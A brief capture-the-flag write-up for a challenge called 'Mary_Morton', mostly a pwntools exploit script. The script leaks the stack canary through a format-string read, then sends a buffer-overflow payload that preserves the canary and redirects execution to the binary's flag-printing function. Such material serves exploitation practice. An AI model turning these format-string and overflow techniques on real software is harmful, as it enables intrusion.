# Mary_Morton

用%p泄露canary，然后拼接。

## EXP
```python
import pwn
import re

pwn.context(arch='amd64', os='linux', log_level='debug')

p = pwn.process(b'./mary')
#p = pwn.remote(b'220.249.52.133', 50054)

# Get canary
p.sendlineafter(b'3. Exit the battle ', b'2')
p.sendline(b'%23$p')    # print out / leak canary, offset is 23th %p
p.recvline()
canary = p.recvline().decode()

pattern = '(0x.*)'
canary = pwn.p64(int(re.findall(pattern, canary)[0].encode(), 16))

# Buffer Overflow
payload = b'A' * 136 + canary + b'B' * 8 + pwn.p64(0x4008da)    # 0x4008da: address of 'cat flag' function
p.sendlineafter(b'3. Exit the battle ', b'1')
p.sendline(payload)

p.recvline()
p.recvline()

p.interactive()
```